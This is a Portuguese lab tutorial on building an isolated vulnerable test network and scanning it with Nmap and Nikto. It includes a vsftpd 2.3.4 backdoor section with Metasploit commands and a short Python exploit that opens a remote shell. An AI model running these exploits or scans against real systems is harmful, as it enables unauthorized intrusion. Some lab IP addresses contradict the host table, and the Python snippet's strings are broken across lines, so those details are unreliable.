# Aula Prática - Ambientes Vulneráveis para Testes com Scanners

## Índice

1. [Observações](#observações)
2. [Topologia do Laboratório](#topologia-proposta)
   - [Componentes da Topologia](#componentes-da-topologia)
   - [Vantagens da Arquitetura](#vantagens-da-arquitetura)
   - [Recomendações Técnicas](#recomendações-técnicas)
3. [Distribuições e Imagens](#distribuições-e-imagens-utilizadas)
   - [Metasploitable2](#1-metasploitable2---maquina-virtual-vulneravel)
   - [DVWA](#2-dvwa---damn-vulnerable-web-application)
   - [Vulhub](#3-vulhub---ambientes-docker-com-cves)
   - [Kali Linux](#4-kali-linux---distribuicao-para-testes-de-invasao)
4. [Iniciando Laboratórios](#iniciando-laboratorios)
   - [Recursos e Links](#recursos-e-links)
   - [Configuração dos Hosts](#tabela-de-hosts)
   - [Configuração de Redes](#tabela-de-redes-do-virtual-box)
5. [Primeiros Scans](#fazendo-os-primeiros-scans)
   - [NMAP - Conceitos Básicos](#o-que-é-o-nmap)
   - [Exemplos de Uso](#exemplos-basicos-de-uso)
   - [Análise de Serviços](#analise-de-servico-identificado-com-nmap)
   - [Exploração de Vulnerabilidades](#exploracao-com-metasploit)
6. [Nikto - Scanner Web](#nikto)
   - [Visão Geral](#o-que-é-o-nikto)
   - [Funcionalidades](#funcionalidades-principais)
   - [Considerações Técnicas](#considerações-técnicas)
   - [Exemplos de Uso](#exemplos-de-uso)

<hr>

## 1. Observações

- Nunca utilize essas ferramentas ou ambientes em redes de terceiros sem autorização explícita.
- Sempre isole os ambientes vulneráveis em máquinas virtuais ou redes internas controladas.

<hr>

## 2. Topologia do Laboratório

![image](https://github.com/user-attachments/assets/9f3f202a-090b-4077-83f8-052decbea686)

### 2.1 Componentes da Topologia

- **MS2 (Metasploitable2):** Máquina virtual com diversas falhas conhecidas, usada como alvo em testes de exploração.
- **DVWA (Damn Vulnerable Web App):** Aplicação web vulnerável escrita em PHP/MySQL.
- **Vulhub:** Coleção de containers Docker com CVEs específicos para exploração.
- **Kali:** Distribuição Linux voltada para testes de invasão e segurança ofensiva.
- **FW (Firewall):** Componente intermediário que controla o tráfego entre a rede de laboratório e a internet.
- **Docker:** Host destinado a subir aplicações e testes via docker.
- **Nuvem (Internet):** Símbolo de conexão externa controlada.

### 2.2 Vantagens da Arquitetura

- **Isolamento completo:** Alvos vulneráveis estão em rede separada, sem contato com a rede de produção.
- **Controle de tráfego:** O firewall pode restringir acessos externos e simular ataques internos.
- **Facilidade de escalabilidade:** Novas VMs ou containers podem ser adicionados facilmente.
- **Ambiente seguro para testes reais:** Permite exercícios práticos com ferramentas como Nmap, Nikto, Nessus, sqlmap, etc.

### 2.3 Recomendações Técnicas

- Configure a rede virtual como NAT ou Host-only para evitar exposição externa.
- Garanta que apenas o Kali tenha acesso controlado à internet.
- Utilize ferramentas como `iptables`, `ufw` ou `pfSense` para configurar o FW.


## 3. Distribuições e Imagens Utilizadas

### 3.1 Metasploitable2 - Máquina Virtual Vulnerável

**Link para download:**
https://sourceforge.net/projects/metasploitable/

**Descrição:**
Distribuição Linux projetada com diversas falhas propositalmente. Ideal para testes com Nmap, Nessus, OpenVAS, etc.

**Credenciais padrão:**
- Usuário: msfadmin
- Senha: msfadmin

**Requisitos:**
- VMware ou VirtualBox
- Alocar 1 GB de RAM e pelo menos 10 GB de disco

---

### 2. DVWA - Damn Vulnerable Web Application

**Repositorio GitHub:**
https://github.com/digininja/DVWA

**Descricao:**
Aplicacao web vulneravel escrita em PHP/MySQL. Simula diversas falhas: SQL Injection, XSS, CSRF, etc.

**Passos para instalacao (Linux com Apache e MySQL):**

```bash
git clone https://github.com/digininja/DVWA.git
sudo cp -r DVWA /var/www/html/
sudo chown -R www-data:www-data /var/www/html/DVWA
sudo service apache2 start
sudo service mysql start
```

**Configuracao:**  
Edite o arquivo `config/config.inc.php` para ajustar as credenciais do MySQL.

**Banco de dados:**  
Acesse http://localhost/DVWA/setup.php e clique em "Create / Reset Database".

---

### 3. Vulhub - Ambientes Docker com CVEs

**Repositorio GitHub:**  
https://github.com/vulhub/vulhub

**Descricao:**  
Projeto com dezenas de ambientes vulneraveis prontos, usando Docker e docker-compose.

**Instalacao:**

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/wordpress/CVE-2019-8942
docker-compose up -d
```

**Requisitos:**  
- Docker instalado  
- Docker Compose

**Exemplo de uso:**  
Ambiente WordPress vulneravel a CVE-2019-8942 sera exposto nas portas padroes para testes com ferramentas como Nikto, Nmap, etc...

---

### 4. Kali Linux - Distribuicao para Testes de Invasao

**Site oficial:**  
https://www.kali.org/

**Descricao:**  
Distribuicao baseada em Debian voltada para profissionais de seguranca. Contem centenas de ferramentas pre-instaladas, incluindo Nmap, Nikto, Burp Suite, Metasploit, John the Ripper, e muito mais.

**Instalacao:**  
- Pode ser usada como maquina virtual, pendrive bootavel ou instalada diretamente  
- Disponivel para download em ISO, VMs pre-configuradas e imagens ARM

**Ferramentas populares no Kali:**  
- `nmap` - scanner de portas  
- `nikto` - scanner de vulnerabilidades web  
- `sqlmap` - injecao SQL automatizada  
- `burpsuite` - proxy de interceptacao para testes web  
- `wpscan` - scanner de vulnerabilidades em WordPress  
- `hydra` - ataques de forca bruta a senhas

**Comando exemplo para Nmap no Kali:**

```bash
nmap -sV -p- 192.168.0.10
```
---

# Iniciando Laboratorios

**Gravacao Youtude do deploy dos servidores**
 - Parte 1 - https://youtu.be/-lkHJ9oY3u0
 - Parte 2 - https://youtu.be/ErhBy_LBRPI

**Links com scripts para configuracoes iniciais**
 - https://github.com/charles-josiah/scriptz/blob/master/setup-router-only-for-lab.sh
 - https://github.com/charles-josiah/scriptz/blob/master/howto-install-docker-ubuntu-2404.md

**Tabela de hosts**

| Nome da VM     | IP Interno     | IP Externo     | Interface Externa | Interface Interna | CPU(s) | Memoria (MB) |
|:--------------:|:--------------:|:--------------:|:-----------------:|:-----------------:|:------:|:-------------:|
| FW - LAB       | 192.168.100.1  | DHCP           | enp2              | eth0              |   1    |    1024       |
| kali           | 192.168.100.12  | 10.0.2.15      |                   | ens3              |   2    |    4096       |
| dvwa           | 192.168.100.14  | -              | -                 | eth0              |   1    |    1024       |
| Vulhub         | 192.168.100.15  | -              | -                 | eth0              |   1    |    1024       |
| MS2            | 192.168.100.16  | -              | -                 | eth0              |   1    |    1024       |
| Docker         | 192.168.100.17  | -              | -                 | eth0              |   1    |    2048       |
| Serv-Base      | 192.168.100.18  | -              | -                 | eth0              |   1    |    2048       |



**Tabela de Redes do Virtual BOX**

| Interface de rede VBox     | Rede Interna    | Rede Externa    |
|:--------------:|:--------------:|:--------------:|
| Rede-LAB     |  X  |    |
| Bridged      |   |  X  |


## Fazendo os primeiros scans
Depois de localizar e acessar o Kali Linux e iniciar o MS2
Fazer um scan, bacana como exemplo abaixo...

### NMAP

#### O que é o Nmap?

O **Nmap (Network Mapper)** é uma ferramenta de código aberto usada para descobrir hosts e serviços em uma rede. Ela realiza mapeamento de portas, identifica sistemas operacionais, versões de serviços e possíveis vulnerabilidades.

#### Capacidades do Nmap:

- Descobrir quais dispositivos estão ativos em uma rede
- Identificar portas abertas
- Descobrir serviços e suas versões como Apache, SSH, etc.
- Identificar o sistema operacional do host
- Rodar scripts NSE para verificar vulnerabilidades conhecidas

### 5.2 Exemplos de Uso do Nmap

#### 1. Scan Simples de Host
```bash
nmap 192.168.0.10
```
> Escaneia as 1000 portas mais comuns do host.

#### 2. Scan de Todas as Portas
```bash
nmap -p- 192.168.0.10
```
> Verifica todas as 65535 portas TCP.

#### 3. Descobrir Versões de Serviços
```bash
nmap -sV 192.168.0.10
```
> Retorna nome e versão de cada serviço nas portas abertas.

#### 4. Scan Agressivo com SO e Traceroute
```bash
nmap -A 192.168.0.10
```
> Faz detecção de sistema operacional, traceroute, versão de serviços e scripts NSE.

#### 5. Verificar Vulnerabilidades com Script
```bash
nmap --script vuln -p 21 192.168.0.10
```
> Usa o motor de scripts para verificar vulnerabilidades conhecidas no serviço FTP.

### 5.3 Opções Úteis do Nmap

| Opção              | Descrição                                       |
|--------------------|-------------------------------------------------|
| `-sS`              | TCP SYN scan (modo furtivo)                     |
| `-O`               | Tenta identificar o sistema operacional         |
| `-Pn`              | Ignora ping; assume que o host está ativo       |
| `-T4`              | Acelera o escaneamento (uso comum em LAN)       |
| `-oN resultado.txt`| Salva o resultado em arquivo texto              |

### 5.4 Documentação Oficial do Nmap
- [Nmap Reference Guide](https://nmap.org/book/)
- [NSE Documentation](https://nmap.org/nsedoc/)

### 5.5 Prática no Laboratório

Vamos testar o host MS2 do nosso lab:

```bash
nmap -sV -p- 192.168.100.12
```

Resultado:
<img width="947" alt="image" src="https://github.com/user-attachments/assets/572f3c67-cdd2-4d8d-adf5-c2a0d34efc91" />

### 5.6 Análise de Vulnerabilidade: vsftpd 2.3.4

#### Detalhes do CVE-2011-2523

##### Contexto Histórico
O atacante modificou o código-fonte da versão 2.3.4, inserindo um backdoor deliberado. Este código malicioso não estava presente no repositório oficial de desenvolvimento, apenas na cópia que foi publicada para download no site principal.

##### Funcionamento
- Backdoor ativado por login contendo `:)` via FTP
- Abre shell de comando na porta 6200
- Permite acesso remoto ao sistema

##### Impacto
- Execução de comandos no sistema alvo sem autenticação
- Comprometimento total da máquina
- Acesso remoto como root (dependendo da configuração)

###### Reação do desenvolvedor

- Chris Evans, criador do vsftpd, publicou um alerta explicando a situação e denunciou o comprometimento da integridade do servidor de distribuição:

###### Fontes Adicionais

- CVE detalhado: https://nvd.nist.gov/vuln/detail/CVE-2011-2523  
- Debian Security Tracker: https://security-tracker.debian.org/tracker/CVE-2011-2523  
- GitHub com script: https://github.com/nobodyatall648/CVE-2011-2523

###### Recomendacoes

- Atualizar o vsftpd para uma versao posterior
- Bloquear a porta 6200 caso detectada
- Substituir FTP por SFTP ou FTPS
- Monitorar logs de conexao na porta 21

---

##### Exploracao com Metasploit

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <IP_DO_ALVO>
run
```
![image](https://github.com/user-attachments/assets/7b37d6f6-c203-4c2a-b415-519cbace4e92)

Facil assim como a vida deve ser...

**Referencia:**  
https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/

---

###### Verificacao com Nmap

```bash
nmap --script ftp-vsftpd-backdoor -p 21 <IP_DO_ALVO>
```
![image](https://github.com/user-attachments/assets/2be7fb48-9b83-435a-8e95-742996d256d2)

**Referencia do script:**  
https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html

---

###### Exploit Manual (Python)

```python
from telnetlib import Telnet

host = "192.168.0.10"
tn = Telnet(host, 21)
tn.read_until(b"(vsFTPd 2.3.4)")
tn.write(b"USER test:)
")
tn.write(b"PASS test
")

shell = Telnet(host, 6200)
shell.interact()
```

**Exploit DB:**  
https://www.exploit-db.com/exploits/49757

---

### Nikto

#### 6.1 O que é o Nikto?

O Nikto é uma ferramenta de código aberto, escrita em Perl, utilizada para escanear servidores web em busca de vulnerabilidades conhecidas. Ela realiza verificações abrangentes em servidores HTTP/HTTPS, identificando arquivos e scripts potencialmente perigosos, configurações incorretas e versões vulneráveis de softwares.

#### 6.2 Funcionalidades Principais

- **Detecção de Vulnerabilidades:** Identifica arquivos e scripts inseguros
- **Análise de Versões:** Verifica versões de software conhecidas por serem vulneráveis
- **Avaliação de Configurações:** Identifica configurações de segurança incorretas (ex: permissões perigosas de arquivos)
- **Suporte Abrangente:** Realiza testes contra servidores HTTP/HTTPS
- **Recursos Avançados:** Suporta autenticação básica, proxy, SSL, e ataques a hosts virtuais

#### 6.3 Considerações Técnicas

- **Detecção:** O Nikto não é stealth, ou seja, ele não tenta evitar detecção por IDS/IPS
- **Ambiente de Uso:** É uma excelente ferramenta de validação inicial em ambientes de teste e homologação
- **Precisão:** Pode gerar muitos falsos positivos, pois utiliza uma base ampla de assinaturas

#### 6.4 Exemplos de Uso

#### 1. Scan Básico
```bash
nikto -h http://192.168.100.14
```
> Realiza um scan básico no servidor web alvo.

#### 2. Scan com SSL
```bash
nikto -h https://192.168.100.14 -ssl
```
> Executa scan em servidor HTTPS.

#### 3. Scan com Autenticação
```bash
nikto -h http://192.168.100.14 -id admin:senha123
```
> Realiza scan usando credenciais de autenticação básica.

#### 4. Scan com Saída em Arquivo
```bash
nikto -h http://192.168.100.14 -output relatorio.html -Format html
```
> Gera relatório em formato HTML.

### 6.5 Documentação e Recursos

- **GitHub:** [https://github.com/sullo/nikto](https://github.com/sullo/nikto)
- **Site Oficial:** [https://cirt.net/Nikto2](https://cirt.net/Nikto2)
- **Wiki:** [https://github.com/sullo/nikto/wiki](https://github.com/sullo/nikto/wiki)

### 6.6 Prática no Laboratório

Vamos executar um scan básico no servidor web do nosso laboratório:

```bash
nikto -h http://192.168.100.11
```

#### Resultado do Scan
![Resultado do scan do Nikto](./nikto.png)

> O scan do Nikto mostra diversas vulnerabilidades potenciais encontradas no servidor web, incluindo versões de software, arquivos sensíveis e configurações incorretas.

---
